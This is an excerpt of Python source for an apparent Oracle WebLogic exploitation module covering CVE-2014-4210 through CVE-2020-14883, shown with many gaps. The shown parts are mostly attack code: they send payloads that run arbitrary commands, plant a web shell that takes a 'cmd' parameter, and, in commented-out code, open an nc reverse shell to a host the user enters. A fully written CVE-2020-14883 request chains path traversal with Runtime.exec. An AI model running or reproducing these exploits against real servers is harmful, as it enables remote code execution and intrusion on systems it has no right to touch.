import random,string,requests,http.client,base64,re,socket,time,platform,ssl
...
#        self.payload_cve_2020_2555 = '%s%s' % ('{:08x}'.format(len(self.payload_cve_2020_2555) // 2 + 4), self.payload_cve_2020_2555)
    ...
    def cve_2014_4210(self):
        ...
        self.r = "PoCWating"
        self.info = CodeTest.Colored_.ssrf() + " [url:" + self.url + self.path + " ]"
        self.rawdata = "null"
        try:
    ...
    def cve_2017_3506(self):
        ...
        self.info = CodeTest.Colored_.upload()
        self.rawdata = "null"
        self.method = "post"
        ...
        try:
            if VULN == 'False':
                ...
                self.shellpath = self.url+"/wls-wsat/"+self.filename+"?pwd=password&cmd="+self.CMD
    ...
    def cve_2017_10271(self):
        ...
        self.info = CodeTest.Colored_.derce() + " [nc shell]"
...
#                if self.CMD == "nc":
#                    self.ncip = input(now.timed(de=DELAY)+CodeTest.Colored_.green("[+] Nc host(ip): "))
#                    self.ncport = input(now.timed(de=DELAY)+CodeTest.Colored_.green("[+] Nc port: "))
#                    self.nc = self.weblogic_nc.replace("REIP", self.ncip).replace("REPORT", self.ncport)
#                    self.request = requests.post(self.url+"/wls-wsat/CoordinatorPortType", data=self.nc, 
#                        headers=self.headers, timeout=TIMEOUT, verify=False)
#                    if self.request.status_code == 500:
...
#                        CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
    ...
    def cve_2018_2894(self):
        ...
        self.info = CodeTest.Colored_.deupload()
    ...
    def cve_2019_2725(self):
        ...
        try:
            ...
            if r"10" in self.v:
                ...
                self.payload = self.payload_cve_2019_2725_rce_12.replace("RECOMMAND", self.CMD)
            else:
                self.payload = self.payload_cve_2019_2725_rce_10
            self.request = requests.post(self.url + "/wls-wsat/CoordinatorPortType", data=self.payload,
    ...
    def cve_2020_2551(self):
        ...
        self.info = CodeTest.Colored_.derce()
        self.path = "/wls-wsat/CoordinatorPortType"
    ...
    def cve_2020_2555(self):
        ...
        try:
            if VULN == 'False':
                ...
                self.payload += '{:04x}'.format(len(self.CMD))
                self.payload += self.CMD.encode().hex()
    ...
    def cve_2020_14883(self):
        self.pocname = "Oracle WebLogic: CVE-2020-14883"
        self.info = CodeTest.Colored_.rce()
        self.method = "get"
        self.rawdata = "null"
        self.r = "PoCWating"
        self.dnslog = Dnslog()
        self.path = "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27{}%27);%22)"
        self.headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
                  'application/signed-exchange;v=b3;q=0.9',
        ...
        try:
            if VULN == 'False':
                self.path = self.path.format('ping '+ self.dnslog.dns_host())
                self.request = requests.get(self.url + self.path, headers=self.headers,
                                            timeout=TIMEOUT, verify=False)
                if self.dnslog.result():
                    self.r = "PoCSuCCeSS"
                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                else:
                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.path = self.path.format(self.CMD)
                self.request = requests.get(self.url + self.path, headers=self.headers,
                                            timeout=TIMEOUT, verify=False)
                #self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
...
def check(**kwargs):
    ...
    if VULN == 'False':
        ExpOracleWeblogic = OracleWeblogic(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpOracleWeblogic = OracleWeblogic(_urlparse(kwargs['url']),kwargs['cmd'])
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpOracleWeblogic, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
    else:#调用所有函数
        for func in dir(OracleWeblogic):
            if not func.startswith("__"):
                methodcaller(func)(ExpOracleWeblogic)
